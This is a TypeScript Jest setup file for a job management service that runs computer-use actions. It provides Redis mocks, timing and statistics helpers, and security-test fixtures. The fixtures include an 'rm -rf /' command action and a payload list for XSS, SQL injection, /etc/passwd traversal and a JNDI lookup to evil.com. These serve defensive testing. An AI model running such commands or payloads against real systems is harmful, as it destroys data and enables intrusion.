/**
 * Job Management Testing Framework Setup
 *
 * Comprehensive test setup for enterprise job management system
 * providing common utilities, mocks, and configurations for all test types.
 *
 * Setup Coverage:
 * - Global test utilities and helpers
 * - Mock configurations and factories
 * - Test data generators
 * - Performance monitoring setup
 * - Security testing utilities
 * - Environment configuration
 * - Database and Redis setup
 * - Logging and reporting configuration
 *
 * @version 1.0.0 - Complete Job Management Test Setup
 * @author Testing Framework Specialist
 */

import { TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import Redis from 'ioredis';
import * as crypto from 'crypto';
import {
  JobManagementService,
  JobStatus,
  JobPriority,
  JobResult,
  JobOptions,
} from '../../src/computer-use/job-management.service';
import { ComputerAction } from '@bytebot/shared';

// Global test configuration
declare global {
  namespace NodeJS {
    interface Global {
      testApp?: INestApplication;
      testRedis?: Redis;
      testUtils?: TestUtils;
      testConfig?: TestConfiguration;
    }
  }
}

/**
 * Test configuration interface
 */
export interface TestConfiguration {
  redis: {
    host: string;
    port: number;
    db: number;
    password?: string;
  };
  timeouts: {
    unit: number;
    integration: number;
    performance: number;
    chaos: number;
    security: number;
  };
  thresholds: {
    performance: {
      jobSubmissionRate: number;
      executionLatency: number;
      queueOperationLatency: number;
    };
    security: {
      encryptionEntropy: number;
      maxFailureRate: number;
    };
  };
}

/**
 * Default test configuration
 */
export const DEFAULT_TEST_CONFIG: TestConfiguration = {
  redis: {
    host: process.env.REDIS_HOST || 'localhost',
    port: parseInt(process.env.REDIS_PORT || '6379'),
    db: parseInt(process.env.REDIS_TEST_DB || '15'),
    password: process.env.REDIS_PASSWORD,
  },
  timeouts: {
    unit: 30000, // 30 seconds
    integration: 120000, // 2 minutes
    performance: 300000, // 5 minutes
    chaos: 300000, // 5 minutes
    security: 120000, // 2 minutes
  },
  thresholds: {
    performance: {
      jobSubmissionRate: 1000, // jobs per second
      executionLatency: 500, // milliseconds
      queueOperationLatency: 10, // milliseconds
    },
    security: {
      encryptionEntropy: 4.0, // minimum entropy
      maxFailureRate: 0.05, // 5% maximum failure rate
    },
  },
};

/**
 * Test utilities class
 */
export class TestUtils {
  private static instance: TestUtils;

  public static getInstance(): TestUtils {
    if (!TestUtils.instance) {
      TestUtils.instance = new TestUtils();
    }
    return TestUtils.instance;
  }

  /**
   * Generate test computer actions
   */
  generateTestAction(
    type: 'simple' | 'complex' | 'malicious' = 'simple',
  ): ComputerAction {
    switch (type) {
      case 'simple':
        return {
          action: 'get_cursor_position',
        };

      case 'complex':
        return {
          action: 'screenshot',
          coordinates: { x: 100, y: 200 },
          options: { quality: 90 },
        };

      case 'malicious':
        return {
          action: 'execute_command',
          command: 'rm -rf /',
        };

      default:
        return { action: 'get_cursor_position' };
    }
  }

  /**
   * Generate test job options
   */
  generateJobOptions(overrides: Partial<JobOptions> = {}): JobOptions {
    return {
      priority: JobPriority.NORMAL,
      timeout: 30000,
      maxRetries: 3,
      tags: ['test'],
      metadata: {
        userId: 'test-user',
        sessionId: 'test-session',
        correlationId: this.generateUniqueId(),
      },
      ...overrides,
    };
  }

  /**
   * Generate unique test ID
   */
  generateUniqueId(): string {
    return `test-${Date.now()}-${Math.random().toString(36).substring(7)}`;
  }

  /**
   * Wait for job completion with timeout
   */
  async waitForJobCompletion(
    service: JobManagementService,
    jobId: string,
    timeout: number = 30000,
  ): Promise<JobResult> {
    const startTime = Date.now();
    const checkInterval = 100;

    while (Date.now() - startTime < timeout) {
      try {
        const status = await service.getJobStatus(jobId);

        if (
          status.status === JobStatus.COMPLETED ||
          status.status === JobStatus.FAILED ||
          status.status === JobStatus.CANCELLED ||
          status.status === JobStatus.TIMEOUT
        ) {
          return status;
        }

        await this.sleep(checkInterval);
      } catch (error) {
        // Job may not be ready yet
        await this.sleep(checkInterval);
      }
    }

    throw new Error(`Job ${jobId} did not complete within ${timeout}ms`);
  }

  /**
   * Create multiple jobs concurrently
   */
  async createJobsBatch(
    service: JobManagementService,
    count: number,
    actionType: 'simple' | 'complex' | 'malicious' = 'simple',
  ): Promise<string[]> {
    const promises = Array.from({ length: count }, () =>
      service.createJob(
        this.generateTestAction(actionType),
        this.generateJobOptions(),
      ),
    );

    return Promise.all(promises);
  }

  /**
   * Sleep utility
   */
  async sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  /**
   * Generate large payload for testing
   */
  generateLargePayload(sizeInMB: number): string {
    const sizeInBytes = sizeInMB * 1024 * 1024;
    return 'A'.repeat(sizeInBytes);
  }

  /**
   * Generate malicious payloads for security testing
   */
  generateMaliciousPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      "'; DROP TABLE jobs; --",
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
      '\x00\x01\x02\x03',
      'A'.repeat(10000),
    ];
  }

  /**
   * Measure execution time
   */
  async measureExecutionTime<T>(
    operation: () => Promise<T>,
  ): Promise<{ result: T; time: number }> {
    const startTime = performance.now();
    const result = await operation();
    const endTime = performance.now();

    return {
      result,
      time: endTime - startTime,
    };
  }

  /**
   * Calculate statistics from array of numbers
   */
  calculateStats(numbers: number[]): {
    mean: number;
    median: number;
    min: number;
    max: number;
    p95: number;
    p99: number;
    stdDev: number;
  } {
    const sorted = numbers.sort((a, b) => a - b);
    const len = sorted.length;

    const mean = sorted.reduce((sum, val) => sum + val, 0) / len;
    const median =
      len % 2 === 0
        ? (sorted[len / 2 - 1] + sorted[len / 2]) / 2
        : sorted[Math.floor(len / 2)];

    const variance =
      sorted.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / len;
    const stdDev = Math.sqrt(variance);

    return {
      mean,
      median,
      min: sorted[0],
      max: sorted[len - 1],
      p95: sorted[Math.floor(len * 0.95)],
      p99: sorted[Math.floor(len * 0.99)],
      stdDev,
    };
  }

  /**
   * Validate encryption quality
   */
  validateEncryption(encryptedData: string): {
    hasProperFormat: boolean;
    hasHighEntropy: boolean;
    entropy: number;
  } {
    const parts = encryptedData.split(':');
    const hasProperFormat = parts.length === 3;

    // Calculate entropy
    const entropy = this.calculateEntropy(encryptedData);
    const hasHighEntropy =
      entropy > DEFAULT_TEST_CONFIG.thresholds.security.encryptionEntropy;

    return {
      hasProperFormat,
      hasHighEntropy,
      entropy,
    };
  }

  /**
   * Calculate entropy of a string
   */
  private calculateEntropy(str: string): number {
    const freq = new Map<string, number>();

    for (const char of str) {
      freq.set(char, (freq.get(char) || 0) + 1);
    }

    let entropy = 0;
    const len = str.length;

    for (const count of freq.values()) {
      const p = count / len;
      entropy -= p * Math.log2(p);
    }

    return entropy;
  }

  /**
   * Clean Redis test data
   */
  async cleanRedisTestData(redis: Redis): Promise<void> {
    const keys = await redis.keys('bytebot:jobs:*');
    if (keys.length > 0) {
      await redis.del(...keys);
    }

    const statusKeys = await redis.keys('bytebot:jobs:status:*');
    if (statusKeys.length > 0) {
      await redis.del(...statusKeys);
    }

    const priorityKeys = await redis.keys('bytebot:jobs:priority:*');
    if (priorityKeys.length > 0) {
      await redis.del(...priorityKeys);
    }
  }

  /**
   * Setup test Redis client
   */
  async setupTestRedis(config: TestConfiguration['redis']): Promise<Redis> {
    const redis = new Redis({
      ...config,
      lazyConnect: true,
      retryDelayOnFailover: 100,
      maxRetriesPerRequest: 3,
    });

    await redis.connect();
    await redis.flushdb(); // Clean test database

    return redis;
  }

  /**
   * Generate performance test report
   */
  generatePerformanceReport(metrics: {
    throughput: number;
    latency: number[];
    errorRate: number;
    memoryUsage: number;
  }): string {
    const latencyStats = this.calculateStats(metrics.latency);

    return `
Performance Test Report
======================
Throughput: ${metrics.throughput.toFixed(2)} ops/sec
Latency (ms):
  - Mean: ${latencyStats.mean.toFixed(2)}
  - Median: ${latencyStats.median.toFixed(2)}
  - 95th percentile: ${latencyStats.p95.toFixed(2)}
  - 99th percentile: ${latencyStats.p99.toFixed(2)}
  - Min: ${latencyStats.min.toFixed(2)}
  - Max: ${latencyStats.max.toFixed(2)}
Error Rate: ${(metrics.errorRate * 100).toFixed(2)}%
Memory Usage: ${(metrics.memoryUsage / 1024 / 1024).toFixed(2)} MB
    `.trim();
  }

  /**
   * Generate security test report
   */
  generateSecurityReport(results: {
    encryptionTests: number;
    accessControlTests: number;
    inputValidationTests: number;
    passed: number;
    failed: number;
  }): string {
    const total = results.passed + results.failed;
    const passRate = total > 0 ? (results.passed / total) * 100 : 0;

    return `
Security Test Report
===================
Total Tests: ${total}
Passed: ${results.passed}
Failed: ${results.failed}
Pass Rate: ${passRate.toFixed(1)}%

Test Categories:
- Encryption Tests: ${results.encryptionTests}
- Access Control Tests: ${results.accessControlTests}
- Input Validation Tests: ${results.inputValidationTests}
    `.trim();
  }
}

/**
 * Mock factory for creating test mocks
 */
export class MockFactory {
  /**
   * Create mock Redis client
   */
  static createMockRedis(): jest.Mocked<Redis> {
    return {
      get: jest.fn(),
      set: jest.fn(),
      setex: jest.fn(),
      del: jest.fn(),
      exists: jest.fn(),
      keys: jest.fn(),
      flushdb: jest.fn(),
      quit: jest.fn(),
      connect: jest.fn(),
      disconnect: jest.fn(),
      sadd: jest.fn(),
      srem: jest.fn(),
      smembers: jest.fn(),
      multi: jest.fn(() => MockFactory.createMockRedisPipeline()),
      pipeline: jest.fn(() => MockFactory.createMockRedisPipeline()),
      on: jest.fn(),
      off: jest.fn(),
      status: 'ready',
    } as any;
  }

  /**
   * Create mock Redis pipeline
   */
  static createMockRedisPipeline(): jest.Mocked<any> {
    return {
      set: jest.fn().mockReturnThis(),
      setex: jest.fn().mockReturnThis(),
      del: jest.fn().mockReturnThis(),
      sadd: jest.fn().mockReturnThis(),
      srem: jest.fn().mockReturnThis(),
      exec: jest.fn().mockResolvedValue([
        [null, 'OK'],
        [null, 1],
      ]),
    };
  }

  /**
   * Create mock job management service
   */
  static createMockJobManagementService(): jest.Mocked<JobManagementService> {
    return {
      createJob: jest.fn(),
      getJobStatus: jest.fn(),
      getJobResult: jest.fn(),
      cancelJob: jest.fn(),
      getQueueStats: jest.fn(),
      getWorkerStats: jest.fn(),
      forceCleanup: jest.fn(),
      onModuleInit: jest.fn(),
      onModuleDestroy: jest.fn(),
    } as any;
  }
}

/**
 * Global test setup
 */
beforeAll(async () => {
  // Set global test configuration
  global.testConfig = DEFAULT_TEST_CONFIG;

  // Set global test utilities
  global.testUtils = TestUtils.getInstance();

  // Extend Jest timeout for all tests
  jest.setTimeout(DEFAULT_TEST_CONFIG.timeouts.unit);

  // Setup global error handling
  process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  });

  console.log('Job Management Test Framework initialized');
});

/**
 * Global test cleanup
 */
afterAll(async () => {
  // Clean up global resources
  if (global.testRedis) {
    await global.testRedis.quit();
  }

  if (global.testApp) {
    await global.testApp.close();
  }

  console.log('Job Management Test Framework cleanup completed');
});

/**
 * Test environment detection
 */
export const isCI = process.env.CI === 'true';
export const isDevelopment = process.env.NODE_ENV === 'development';
export const isProduction = process.env.NODE_ENV === 'production';

/**
 * Test skip conditions
 */
export const skipOnCI = isCI ? describe.skip : describe;
export const skipInProduction = isProduction ? describe.skip : describe;
export const runOnlyInDevelopment = isDevelopment ? describe : describe.skip;
